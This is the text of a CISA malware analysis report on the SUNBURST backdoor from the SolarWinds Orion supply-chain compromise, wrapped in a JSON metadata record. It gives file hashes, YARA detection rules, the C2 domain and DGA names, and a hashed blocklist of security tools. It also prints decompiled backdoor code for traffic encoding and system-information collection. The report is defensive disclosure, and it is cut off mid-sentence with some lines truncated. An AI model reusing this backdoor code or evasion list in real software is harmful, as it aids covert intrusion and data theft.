{
    "id": "2ce87fe7-f418-4d14-aea6-6c96dfb80da5",
    "created_at": "2023-01-12T15:01:41.617349Z",
    "updated_at": "2025-03-27T02:16:01.063571Z",
    "deleted_at": null,
    "sha1_hash": "794044eee97925425170e5380bf0b61caf3b877c",
    "title": "2021-02-08 - Malware Analysis Report (AR21-039A)- SUNBURST",
    "authors": "",
    "file_creation_date": "2022-05-29T01:06:10Z",
    "file_modification_date": "2022-05-29T01:06:10Z",
    "file_size": 579514,
    "plain_text": "# MAR-10318845-1.v1 - SUNBURST\n\n**us-cert.cisa.gov/ncas/analysis-reports/ar21-039a**\n\n**_Updated April 15, 2021: The U.S. Government attributes this activity to the Russian Foreign Intelligence Service (SVR). Additional_**\n**_information may be found in a_** **_[statement from the White House. For more information on SolarWinds-related activity, go to](https://www.whitehouse.gov/briefing-room/statements-releases/2021/04/15/fact-sheet-imposing-costs-for-harmful-foreign-activities-by-the-russian-government/)_**\n**_[https://us-cert.cisa.gov/remediating-apt-compromised-networks and](https://us-cert.cisa.gov/remediating-apt-compromised-networks)_** **_[https://www.cisa.gov/supply-chain-compromise.](https://www.cisa.gov/supply-chain-compromise)_**\n\nMalware Analysis Report\n\n10318845.r1.v1\n\n2021-02-05\n\n## Notification\n\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of an\ninformation contained herein. The DHS does not endorse any commercial product or service referenced in this bulletin or otherwise.\n\nThis document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeab\naccordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distribute\nFor more information on the Traffic Light Protocol (TLP), see http://www.us-cert.gov/tlp.\n\n## Summary\n\nDescription\n\nThis report provides detailed analysis of several malicious artifacts associated with a sophisticated supply chain compromise of SolarWinds Orion\nsoftware, identified by the security company FireEye as SUNBURST.\n\nAfter being delivered as part of certain SolarWinds updates, a trojanized version of the “solarwinds.orion.core.businesslayer.dll” containing SUNB\ninstalled by a legitimate SolarWinds installer application. The modified dynamic-link library (DLL) contains an obfuscated backdoor that allows a re\nexecute various functions on the compromised system, as well as deploy additional payloads and exfiltrate data. The embedded SUNBURST cod\ncommunications to the remote operator using XOR encryption and modified Base64 encoding. To maintain a low profile, the SUNBURST code wi\ncertain security software running on the target system.\n[For a downloadable copy of IOCs, see: MAR-10318845-1.v1.stix.](https://us-cert.cisa.gov/sites/default/files/publications/MAR-10318845-1.v1.WHITE_stix.xml)\n\nSubmitted Files (4)\n\n019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134 (SolarWinds.Orion.Core.Business...)\n\n32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77 (SolarWinds.Orion.Core.Business...)\n\nce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6 (SolarWinds.Orion.Core.Business...)\n\nd0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600 (SolarWinds-Core-v2019.4.5220-H...)\n\nDomains (1)\n\navsvmcloud.com\n\n## Findings\n\n**32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77**\n\nTags\n\nbackdoorremote-access-trojantrojan\n\nDetails\n\n**Name** SolarWinds.Orion.Core.BusinessLayer.dll\n\n**Size** 1011032 bytes\n\n**Type** PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n**MD5** b91ce2fa41029f6955bff20079468448\n\n**SHA1** 76640508b1e7759e548771a5359eaed353bf1eec\n\n**SHA256** 32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\n\n**SHA512** 6a81f082f36ccbda48070772c5a97e1d7de61ad77465e7befe8cbd97df40dcc5da09c461311708e3d57527e323484b05cfd3e72a3c70e1\n\n**ssdeep** 12288:Zx7m/z9aEBzvnvLtYAi6uLlYQ69BBpIvF1tjpH7BKi+0A8vca9owQ:6aEBTvRBi6uL6dIvDtjpH9+0A8vca9oD\n\n**Entropy** 5.582827\n\nAntivirus\n\n\n-----\n\n**Ahnlab** Backdoor/Win32.SunBurst\n\n**Antiy** Trojan[Backdoor]/MSIL.Agent\n\n**Avira** TR/Sunburst.AO\n\n**BitDefender** Trojan.Sunburst.A\n\n**Clamav** Win.Countermeasure.Sunburst-9809152-0\n\n**Comodo** Backdoor\n\n**Cyren** W32/Trojan.BCCG-2955\n\n**ESET** a variant of MSIL/SunBurst.A trojan\n\n**Emsisoft** Trojan.Win32.Sunburst (A)\n\n**Ikarus** Backdoor.Sunburst\n\n**K7** Trojan ( 00574a531 )\n\n**Lavasoft** Trojan.Sunburst.A\n\n**McAfee** Trojan-sunburst\n\n**Microsoft Security Essentials** Trojan:MSIL/Solorigate.BR!dha\n\n**NANOAV** Trojan.Win32.SunBurst.iduxjk\n\n**Sophos** Mal/Sunburst-A\n\n**Symantec** Backdoor.Sunburst!gen1\n\n**Systweak** trojan-backdoor.sunburst-r\n\n**TrendMicro** Backdoo.6F8C6A1E\n\n**TrendMicro House Call** Backdoo.6F8C6A1E\n\n**Vir.IT eXplorer** Trojan.Win32.SunBurst.A\n\n**VirusBlokAda** TScope.Trojan.MSIL\n\n**Zillya!** Backdoor.Sunburst.Win32.2\n\nYARA Rules\n\nrule CISA_10318927_01 : trojan rat SOLAR_FIRE\n\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\n\nIncident = \"10318927\"\n\nDate = \"2020-12-13\"\nLast_Modified = \"20201213_2145\"\n\nActor = \"n/a\"\n\nCategory = \"TROJAN RAT\"\n\nFamily = \"SOLAR_FIRE\"\n\nDescription = \"This signature is based off of unique strings embedded within the modified Solar Winds app\"\n\nMD5_1 = \"b91ce2fa41029f6955bff20079468448\"\n\nSHA256_1 = \"32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\"\n\nMD5_2 = \"846e27a652a5e1bfbd0ddd38a16dc865\"\n\nSHA256_2 = \"ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6\"\n\nstrings:\n\n$s0 = { 63 00 30 00 6B 00 74 00 54 00 69 00 37 00 4B 00 4C 00 43 00 6A 00 4A 00 7A 00 4D 00 38 00 44 }\n\n$s1 = { 41 00 41 00 3D 00 3D 00 00 21 38 00 33 00 56 00 30 00 64 00 6B 00 78 00 4A 00 4B 00 55 }\n\n$s2 = { 63 00 2F 00 46 00 77 00 44 00 6E 00 44 00 4E 00 53 00 30 00 7A 00 4B 00 53 00 55 00 30 00 42 00 41 00 41 00 3D 00 3D }\n\n$s3 = { 53 00 69 00 30 00 75 00 42 00 67 00 41 00 3D 00 00 21 38 00 77 00 77 00 49 00 4C 00 6B 00 33 00 4B 00 53 00 79 00 30 00 4\ncondition:\n\nall of them\n\n}\n\n\n-----\n\ny _ _ _\n{\nmeta:\nAuthor = \"FireEye\"\nDate = \"2020-12-13\"\nLast_Modified = \"20201213_1917\"\nActor = \"n/a\"\nCategory = \"Backdoor\"\nFamily = \"SUNBURST\"\nDescription = \"This rule is looking for portions of the SUNBURST backdoor that are vital to how it functions. The first signature fnv_xor m\nxor that the sample performs on process, service, and driver names/paths. SUNBURST is a backdoor that has the ability to spawn and kill p\ndelete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services.\"\nMD5_1 = \"\"\nSHA256_1 = \"\"\nstrings:\n$cmd_regex_encoded = \"U4qpjjbQtUzUTdONrTY2q42pVapRgooABYxQuIZmtUoA\" wide\n$cmd_regex_plain = { 5C 7B 5B 30 2D 39 61 2D 66 2D 5D 7B 33 36 7D 5C 7D 22 7C 22 5B 30 2D 39 61 2D 66 5D 7B 33 32 7D 22 7C\n66 5D 7B 31 36 7D }\n$fake_orion_event_encoded = \"U3ItS80rCaksSFWyUvIvyszPU9IBAA==\" wide\n$fake_orion_event_plain = { 22 45 76 65 6E 74 54 79 70 65 22 3A 22 4F 72 69 6F 6E 22 2C }\n$fake_orion_eventmanager_encoded = \"U3ItS80r8UvMTVWyUgKzfRPzEtNTi5R0AA==\" wide\n$fake_orion_eventmanager_plain = { 22 45 76 65 6E 74 4E 61 6D 65 22 3A 22 45 76 65 6E 74 4D 61 6E 61 67 65 72 22 2C }\n$fake_orion_message_encoded = \"U/JNLS5OTE9VslKqNqhVAgA=\" wide\n$fake_orion_message_plain = { 22 4D 65 73 73 61 67 65 22 3A 22 7B 30 7D 22 }\n$fnv_xor = { 67 19 D8 A7 3B 90 AC 5B }\ncondition:\n$fnv_xor and ($cmd_regex_encoded or $cmd_regex_plain) or ( ($fake_orion_event_encoded or $fake_orion_event_plain) and\n($fake_orion_eventmanager_encoded or $fake_orion_eventmanager_plain) and ($fake_orion_message_encoded and $fake_orion_messag\n}\n\n\n-----\n\ny _ _ _\n{\nmeta:\nAuthor = \"FireEye\"\nDate = \"2020-12-13\"\nLast_Modified = \"20201213_1917\"\nActor = \"n/a\"\nCategory = \"Backdoor\"\nFamily = \"SUNBURST\"\nDescription = \"The SUNBURST backdoor uses a domain generation algorithm (DGA) as part of C2 communications. This rule is looking\ncode that checks for which HTTP method is being used. This is in one large conjunction, and all branches are then tied together via disjunct\nintentionally designed so that if any part of the DGA is re-used in another sample, this signature should match that re-used portion. SUNBUR\nhas the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set o\ntools and services.\"\nMD5_1 = \"\"\nSHA256_1 = \"\"\nstrings:\n$a = \"0y3Kzy8BAA==\" wide\n$aa = \"S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA\" wide\n$ab = \"S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA=\" wide\n$ac = \"C88sSs1JLS4GAA==\" wide\n$ad = \"C/UEAA==\" wide\n$ae = \"C89MSU8tKQYA\" wide\n$af = \"8wvwBQA=\" wide\n$ag = \"cyzIz8nJBwA=\" wide\n$ah = \"c87JL03xzc/LLMkvysxLBwA=\" wide\n$ai = \"88tPSS0GAA==\" wide\n$aj = \"C8vPKc1NLQYA\" wide\n$ak = \"88wrSS1KS0xOLQYA\" wide\n$al = \"c87PLcjPS80rKQYA\" wide\n$am = \"Ky7PLNAvLUjRBwA=\" wide\n$an = \"06vIzQEA\" wide\n$b = \"0y3NyyxLLSpOzIlPTgQA\" wide\n$c = \"001OBAA=\" wide\n$d = \"0y0oysxNLKqMT04EAA==\" wide\n$e = \"0y3JzE0tLknMLQAA\" wide\n$f = \"003PyU9KzAEA\" wide\n$h = \"0y1OTS4tSk1OBAA=\" wide\n$i = \"K8jO1E8uytGvNqitNqytNqrVA/IA\" wide\n$j = \"c8rPSQEA\" wide\n$k = \"c8rPSfEsSczJTAYA\" wide\n$l = \"c60oKUp0ys9JAQA=\" wide\n$m = \"c60oKUp0ys9J8SxJzMlMBgA=\" wide\n$n = \"8yxJzMlMBgA=\" wide\n$o = \"88lMzygBAA==\" wide\n$p = \"88lMzyjxLEnMyUwGAA==\" wide\n$q = \"C0pNL81JLAIA\" wide\n$r = \"C07NzXTKz0kBAA==\" wide\n$s = \"C07NzXTKz0nxLEnMyUwGAA==\" wide\n$t = \"yy9IzStOzCsGAA==\" wide\n$u = \"y8svyQcA\" wide\n$v = \"SytKTU3LzysBAA==\" wide\n$w = \"C84vLUpOdc5PSQ0oygcA\" wide\n$x = \"C84vLUpODU4tykwLKMoHAA==\" wide\n$y = \"C84vLUpO9UjMC07MKwYA\" wide\n$z = \"C84vLUpO9UjMC04tykwDAA==\" wide\ncondition:\n($a and $b and $c and $d and $e and $f and $h and $i) or ($j and $k and $l and $m and $n and $o and $p and $q and $r and $s and ($\n$u and $v and $w and $x and $y and $z and ($aa or $ab)) or ($ac and $ad and $ae and $af and $ag and $ah and ($am or $an)) or ($ai and\nand ($am or $an))\n}\n\nssdeep Matches\n\nNo matches found.\n\nPE Metadata\n\n**Compile Date** 2020-03-24 04:52:34-04:00\n\n**Import Hash** dae02f32a21e03ce65412f6e56942daa\n\n**Company Name** SolarWinds Worldwide, LLC.\n\n**File Description** SolarWinds.Orion.Core.BusinessLayer\n\n**Internal Name** SolarWinds.Orion.Core.BusinessLayer.dll\n\n**Legal Copyright** Copyright © 1999-2020 SolarWinds Worldwide, LLC. All Rights Reserved.\n\n\n-----\n\n**Original Filename** SolarWinds.Orion.Core.BusinessLayer.dll\n\n**Product Name** SolarWinds.Orion.Core.BusinessLayer\n\n**Product Version** 2019.4.5200.9083\n\nPE Sections\n\n**MD5** **Name** **Raw Size** **Entropy**\n\n9f1dcf8b4df81fdd1e33e8157fb58d9f header 512 2.890704\n\nac9dc455a67c7f2c9f10725d66c115d1 .text 1001472 5.569219\n\n69a064c0b6001299af109ed0d06f6c6f .rsrc 1536 3.015713\n\n275a7e1f11b8e5fefa163e47c22129b4 .reloc 512 0.101910\n\nRelationships\n\n32519b85c0... Connected_To avsvmcloud.com\n\n32519b85c0... Contained_Within d0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600\n\nDescription\n\nThis file is a 32-bit .NET DLL named \"SolarWinds.Orion.Core.BusinessLayer.dll.\" It is a modified SolarWinds-signed plugin component of the Orio\nthat has been patched with the SUNBURST backdoor. This malicious file was signed with a digital certificate issued by Symantec to SolarWinds.\nshould be considered compromised.\n\n--Begin Digital Certificate Information-Signer:   CN=\"Solarwinds Worldwide, LLC\", O=\"Solarwinds Worldwide, LLC\", L=Austin, S=Texas, C=US\nIssuer:   CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=SymantecCorporation, C=US\nSN:     0FE973752022A606ADF2A36E345DC0ED\nNot Before: 1/20/2020 7:00:00 PM\nNot After: 1/20/2023 6:59:59 PM\nThumbprint: 47D92D49E6F7F296260DA1AF355F941EB25360C4\nStatus:   Valid\nStatusMsg: Signature verified.\n--End Digital Certificate Information-\nSUNBURST provides the following capabilities on a compromised system, which are discussed in further detail below.\n\n- Sets a 12 to 14 day delayed execution time\n\n- Stealth\n\n- Command and Control (C2) communication\n\n- Collect system information\n\n- Upload system information from the victim system\n\n- Run specified tasks\n\n- Terminate processes\n\n- Download, read, write, move, delete, and execute files\n\n- Compute file hashes\n\n- Reboot the system\n\n- Adjust process privileges\n\n**DELAYED EXECUTION**\nSUNBURST is executed by a legitimate SolarWinds software application designed to load and run SolarWinds plugins. Once installed, it compare\nrandomly generated value between 288 and 336 hours (12 - 14 days) after the file was written. The malware will sleep until this calculated time fra\nwhich, the malware will begin C2 sessions to retrieve and execute commands or \"Jobs” on behalf of the adversary.\n\n**STEALTH**\nSUNBURST uses obfuscated blocklists consisting of hashed process and service names to identify analysis tools and antivirus software compone\nprocesses, services, and drivers. It utilizes a modified version of the FNV-1a hash algorithm to determine if specific processes are running on the\nenumerate and hash the process names of all running processes and compare the generated hashes to a hard-coded blocklist. If no block-listed p\nwill attempt to resolve the domain \"api.solarwinds.com\" to test for network connectivity. If a block-listed process is found, it does not proceed with\nevasion technique is used to keep it from being detected. The hard coded hashed process names are stored in an unsigned LONG list named \"as\nSee “**BLOCK LIST CHECKING FUNCTIONS**” below in this report for details.\n\n--Begin hard-coded list of block-listed processes and names-1475579823244607677     100-continue\n2734787258623754862     accept\n1368907909245890092     afwserv\n16858955978146406642    apac.lab\n2597124982561782591     apimonitor-x64\n2600364143812063535     apimonitor-x86\n6195833633417633900     aswengsrv\n2934149816356927366     aswidsagent\n\n\n-----\n\ny\n4821863173800309721     autopsy\n13464308873961738403    autopsy64\n3320026265773918739     autoruns\n12969190449276002545    autoruns64\n10657751674541025650    autorunsc\n12094027092655598256    autorunsc64\n2760663353550280147     avastavwrapper\n8146185202538899243     avastsvc\n11818825521849580123    avastui\n11109294216876344399    avgadminclientservice\n2797129108883749491     avgidsagent\n3660705254426876796     avgsvc\n3890794756780010537     avgsvca\n3890769468012566366     avgsvcx\n12709986806548166638    avgui\n14095938998438966337    avgwdsvcx\n13611051401579634621    avp\n18147627057830191163    avpui\n16423314183614230717    bccavsvc\n11913842725949116895    binaryninja\n5449730069165757263     blacklight\n12679195163651834776    brcow_x_x_x_x.sys\n1614465773938842903     brfilter.sys\n11385275378891906608    carbonblack\n13693525876560827283    carbonblackk\n17204844226884380288    cavp\n5984963105389676759     cb\n17849680105131524334    cbcomms\n18246404330670877335    cbstream\n292198192373389586      cff explorer\n14226582801651130532    close\n11266044540366291518    connection\n6116246686670134098     content-type\n10734127004244879770    cork.lab\n18159703063075866524    crexecprev.sys\n11771945869106552231    csagent\n9234894663364701749     csdevicecontrol\n9061219083560670602     csfalconcontainer\n8698326794961817906     csfalconservice\n12790084614253405985    cutter\n16570804352575357627    cve.sys\n17097380490166623672    cybkerneltracker.sys\n16066522799090129502    date\n5219431737322569038     de4dot\n15535773470978271326    debugview\n11073283311104541690    dev.local\n3626142665768487764     dgdmk.sys\n7810436520414958497     diskmon\n4030236413975199654     dmz.local\n13316211011159594063    dnsd\n13825071784440082496    dnspy\n14480775929210717493    dotpeek32\n14482658293117931546    dotpeek64\n8473756179280619170     dumpcap\n15587050164583443069    eamonm\n12718416789200275332    eaw.sys\n9559632696372799208     eelam\n607197993339007484      egui\n14513577387099045298    eguiproxy\n4931721628717906635     ehdrv\n14079676299181301772    ekbdflt\n3200333496547938354     ekrn\n2589926981877829912     ekrnepfw\n8727477769544302060     emea.sales\n17939405613729073960    epfw\n17997967489723066537    epfwwfp\n3778500091710709090     evidence center\n8799118153397725683     exeinfope\n8873858923435176895     expect\n13783346438774742614    f-secure filter\n16112751343173365533    f-secure gatekeeper\n17624147599670377042    f-secure gatekeeper handler starter\n3425260965299690882     f-secure hips\n16066651430762394116    f-secure network request broker\n2380224015317016190     f-secure recognizer\n13655261125244647696    f-secure webui daemon\n12027963942392743532    fakedns\n\n\n-----\n\n9384605490088500348     fe_avk\n15092207615430402812    feelam\n6274014997237900919     fekern\n3320767229281015341     fewscservice\n7412338704062093516     ffdec\n682250828679635420      fiddler\n13014156621614176974    fileinsight\n18150909006539876521    floss\n5587557070429522647     fnrb32\n12445177985737237804    fsaua\n12445232961318634374    fsaus\n17017923349298346219    fsav32\n9333057603143916814     fsbts\n541172992193764396      fsdevcon\n10393903804869831898    fsdfw\n3413052607651207697     fses\n3407972863931386250     fsfw\n10545868833523019926    fsgk32\n521157249538507889      fsgk32st\n3421213182954201407     fsma\n15039834196857999838    fsma32\n3421197789791424393     fsms\n3413886037471417852     fsni\n17978774977754553159    fsorsp\n14243671177281069512    fsorspclient\n14055243717250701608    fssm32\n7315838824213522000     fsvista\n14971809093655817917    fswebuid\n10336842116636872171    gdb\n6943102301517884811     groundling32.sys\n13544031715334011032    groundling64.sys\n397780960855462669      hexisfsmonitor.sys\n13260224381505715848    hiew32\n12785322942775634499    hiew32demo\n17956969551821596225    hollows_hunter\n14256853800858727521    idaq\n8709004393777297355     idaq64\n8129411991672431889     idr\n15514036435533858158    if-modified-since\n15997665423159927228    ildasm\n10829648878147112121    ilspy\n9149947745824492274     jd-gui\n13852439084267373191    keep-alive\n17633734304611248415    ksde\n13581776705111912829    ksdeui\n4578480846255629462     lab.brno\n8381292265993977266     lab.local\n3796405623695665524     lab.na\n5942282052525294911     lab.rio\n17984632978012874803    libwamf.sys\n3656637464651387014     lordpe\n2717025511528702475     lragentmf.sys\n10501212300031893463    microsoft.tri.sensor\n155978580751494388      microsoft.tri.sensor.updater\n5183687599225757871     msmpeng\n10063651499895178962    mssense\n3575761800716667678     officemalscanner\n4501656691368064027     ollydbg\n7701683279824397773     pci.local\n10296494671777307979    pdfstreamdumper\n14630721578341374856    pe-bear\n6461429591783621719     pe-sieve32\n6508141243778577344     pe-sieve64\n4088976323439621041     pebrowse64\n9531326785919727076     peid\n10235971842993272939    pestudio\n2478231962306073784     peview\n9903758755917170407     pexplorer\n14710585101020280896    ppee\n2810460305047003196     procdump\n13611814135072561278    procdump64\n2032008861530788751     processhacker\n6491986958834001955     procexp\n27407921587843457       procexp64\n2128122064571842954     procmon\n10484659978517092504    prodiscoverbasic\n2532538262737333146     psanhost\n\n\n-----\n\np p y\n6088115528707848728     psuamain\n4454255944391929578     psuaservice\n8478833628889826985     py2exedecompiler\n10463926208560207521    r2agent\n7080175711202577138     rabin2\n8697424601205169055     radare2\n16130138450758310172    ramcapture\n7775177810774851294     ramcapture64\n700598796416086955      redcloak\n9007106680104765185     referer\n506634811745884560      reflector\n18294908219222222902    regmon\n3588624367609827560     resourcehacker\n9555688264681862794     retdec-ar-extractor\n5415426428750045503     retdec-bin2llvmir\n3642525650883269872     retdec-bin2pat\n13135068273077306806    retdec-config\n3769837838875367802     retdec-fileinfo\n191060519014405309      retdec-getsig\n1682585410644922036     retdec-idr2pat\n7878537243757499832     retdec-llvmir2hll\n13799353263187722717    retdec-macho-extractor\n1367627386496056834     retdec-pat2yara\n12574535824074203265    retdec-stacofin\n16990567851129491937    retdec-unpacker\n8994091295115840290     retdec-yarac\n13876356431472225791    rundotnetdll\n18392881921099771407    rvsavd.sys\n5132256620104998637     saas.swi\n11801746708619571308    safe-agent.sys\n14968320160131875803    sbiesvc\n14868920869169964081    scdbg\n106672141413120087      scylla_x64\n79089792725215063       scylla_x86\n16335643316870329598    sense\n12343334044036541897    sentinelmonitor.sys\n5614586596107908838     shellcode_launcher\n17291806236368054941    solarwinds.businesslayerhost\n3869935012404164040     solarwindsdiagnostics\n15267980678929160412    swdev.dmz\n1109067043404435916     swdev.local\n14111374107076822891    sysmon\n3538022140597504361     sysmon64\n7175363135479931834     tanium\n3178468437029279937     taniumclient\n13599785766252827703    taniumdetectengine\n6180361713414290679     taniumendpointindex\n8612208440357175863     taniumtracecli\n8408095252303317471     taniumtracewebsocketclient64\n7982848972385914508     task explorer\n8760312338504300643     task explorer-64\n17351543633914244545    tcpdump\n7516148236133302073     tcpvcon\n15114163911481793350    tcpview\n7574774749059321801     user-agent\n15457732070353984570    vboxservice\n16292685861617888592    win32_remote\n10374841591685794123    win64_remotex64\n3045986759481489935     windbg\n917638920165491138      windefend\n17109238199226571972    windump\n5945487981219695001     winhex\n6827032273910657891     winhex64\n8052533790968282297     winobj\n17574002783607647274    wireshark\n3341747963119755850     x32dbg\n14193859431895170587    x64dbg\n15695338751700748390    xagt\n640589622539783622      xagtnotif\n17683972236092287897    xwforensics\n17439059603042731363    xwforensics64\n--End hard-coded list of block-listed processes and names-\n**COMMAND AND CONTROL**\nDuring runtime, SUNBURST hashes its own parent process name, and compares it to the value 17291806236368054941. If it does not match, th\n“OrionImprovementBusinessLayer” will stop executing and the DLL will continue normal activity.\n\n\n-----\n\ng, p g ( ) p g y\nThe connection with the C2 server will contain a randomly generated “customer ID\" that allows the adversary to track different compromised syste\n\nTo establish C2, it will construct and resolve the subdomains of \"avsvmcloud.com\" using a domain generation algorithm (DGA). The following form\nthe domain name:\n\n--Begin format of the domain name-.appsync-api.eu-west-1.avsvmcloud.com\n.appsync-api.us-west-2.avsvmcloud.com\n.appsync-api.us-east-1.avsvmcloud.com\n.appsync-api.us-east-2.avsvmcloud.com\n--End format of the domain name-\nIt will attempt to make a Canonical Name (CNAME) query according to different third-level domain names in combination with the DGA to verify th\naccessible before executing its command control session.\n\n--Begin domain names combined with DGA-6a57jk2ba1d9keg15cbg.appsync-api.eu-west-1.avsvmcloud.com\n7sbvaemscs0mc925tb99.appsync-api.us-west-2.avsvmcloud.com\ngq1h856599gqh538acqn.appsync-api.us-west-2.avsvmcloud.com\nihvpgv9psvq02ffo77et.appsync-api.us-east-2.avsvmcloud.com\nk5kcubuassl3alrf7gm3.appsync-api.eu-west-1.avsvmcloud.com\nmhdosoksaccf9sni9icp.appsync-api.eu-west-1.avsvmcloud.com\n--End domain names plus DGA-\nOutbound communications are encrypted using an embedded class named “CryptoHelper.” The class contains two functions named “CreateSecu\n“Base64Encode.” The function “CreateSecureString” creates a random byte and then utilizes this random byte to encode the string provided. The\nbyte, used as the XOR key, will be stored at offset 0x00 of the encoded string -- allowing the adversary to decrypt the traffic received from this imp\n“CreateSecureString” takes two arguments, a byte array which will be the data targeted for encryption and a bool variable. If this variable is set to\n“OR” the generated “XOR” key byte with the value 128 before using it to XOR encode the provided data. It then calls the Base64Encode function\ncommunication.\n\n--Begin CreateSecureString Function-private static string CreateSecureString(byte[] data, bool flag)\n{\nbyte[] bytes = new byte[data.Length + 1];\nbytes[0] = (byte)new Random().Next(1, (int)sbyte.MaxValue);\nif (flag)\nbytes[0] |= (byte)128;\nfor (int index = 1; index &lt; bytes.Length; ++index)\nbytes[index] = (byte)((uint)data[index - 1] ^ (uint)bytes[0]);\nreturn Base64Encode(bytes, true);\n}\n--End CreateSecureString Function-\nThe Base64Encode function is a modified version of the Base64 algorithm that uses the custom alphabet, \"ph2eifo3n5utg1j8d94qrvbmk0sal76c.”\nencoding makes it harder to interpret network traffic sent between this malicious implant and the remote C2 server. The custom Base64 alphabet\nwould be required to decode the network traffic.\n\n--Begin Base64Encode Function-private static string Base64Encode(byte[] bytes, bool rt)\n{\nstring str1 = OrionImprovementBusinessLayer.ZipHelper.Unzip(\"K8gwSs1MyzfOMy0tSTfMskixNCksKkvKzTYoTswxN0sGAA==\");\nstring str2 = \"\";\nuint num1 = 0;\nint num2 = 0;\nforeach (byte num3 in bytes)\n{\nnum1 |= (uint) num3 &lt;&lt; num2;\nfor (num2 += 8; num2 &gt;= 5; num2 -= 5)\n{\nstr2 += str1[(int) num1 &amp; 31].ToString();\nnum1 &gt;&gt;= 5;\n}\n}\nif (num2 &gt; 0)\n{\nif (rt)\nnum1 |= (uint) (new Random().Next() &lt;&lt; num2);\nstr2 += str1[(int) num1 &amp; 31].ToString();\n}\nreturn str2;\n}\n--End Base64Encode Function-\n**COLLECT SYSTEM INFORMATION**\nThe collection of system description info is carried out by the CollectSystemDescription function.\nIt will collect the following information:\n\n\n-----\n\nDomain name\nHostname\nUsername\nOperating System (OS) version\nSystem directory\nEnvironment tick count - the time since the system was last rebooted.\n\npublic static void CollectSystemDescription(string info, out string result)\n{\nresult = (string) null;\nint i = 0;\nstring domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;\nresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) +\ndomainName;\ntry\n{\nstring str = ((SecurityIdentifier) new NTAccount(domainName,\nOrionImprovementBusinessLayer.ZipHelper.Unzip(Administrator)).Translate(typeof\n(SecurityIdentifier))).AccountDomainSid.ToString();\nresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) +\nstr;\n}\ncatch\n{\nresult += OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i);\n}\nresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) +\nIPGlobalProperties.GetIPGlobalProperties().HostName;\nresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) +\nEnvironment.UserName;\nresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) +\nOrionImprovementBusinessLayer.GetOSVersion(true);\nresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) +\nEnvironment.SystemDirectory;\nresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) +\n(object) (int) TimeSpan.FromMilliseconds((double) (uint)\nEnvironment.TickCount).TotalDays;\nresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) + info\n+ \"\\n\";\nresult += OrionImprovementBusinessLayer.GetNetworkAdapterConfiguration();\n}\n\nThe GetNetworkAdapterConfiguration function will gather information on any attached network adapters and their configuration information.\n\nprivate static string GetNetworkAdapterConfiguration()\n{\nstring str = \"\";\ntry\n{\nusing (ManagementObjectSearcher managementObjectSearcher = new\nManagementObjectSearcher(OrionImprovementBusinessLayer.ZipHelper.Unzip(Select *\nFrom Win32_NetworkAdapterConfiguration where IPEnabled=true)))\n{\nforeach (ManagementObject managementObject in\nmanagementObjectSearcher.Get().Cast<ManagementObject>())\n{\nstr += \"\\n\";\nstr +=\nOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\nOrionImprovementBusinessLayer.ZipHelper.Unzip(Description));\nstr +=\nOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\nOrionImprovementBusinessLayer.ZipHelper.Unzip(MACAddress));\nstr +=\nOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\nOrionImprovementBusinessLayer.ZipHelper.Unzip(DHCPEnabled));\nstr +=\nOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\nOrionImprovementBusinessLayer.ZipHelper.Unzip(DHCPServer));\nstr +=\nOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\nOrionImprovementBusinessLayer.ZipHelper.Unzip(DNSHostName));\nstr +=\nOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\nOrionImprovementBusinessLayer.ZipHelper.Unzip(DNSDomainSuffixSearchOrder));\nstr +=\nOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\n\n\n-----\n\nOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\nOrionImprovementBusinessLayer.ZipHelper.Unzip(IPAddress));\nstr +=\nOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\nOrionImprovementBusinessLayer.ZipHelper.Unzip(IPSubnet));\nstr +=\nOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\nOrionImprovementBusinessLayer.ZipHelper.Unzip(DefaultIPGateway));\n}\nreturn str;\n}\n}\ncatch (Exception ex)\n{\nreturn str + ex.Message;\n}\n\n**UPLOAD SYSTEM INFORMATION**\nThe “UploadSystemDescription” function is used to exfiltrate gathered system information. It parses through HTTP session information to form a f\nsent to the remote C2 server. The modified version of the FNV-1a hash algorithm is utilized to hash certain words associated with outbound HTTP\n“accept” (Hash: 2734787258623754862) and “content-type” 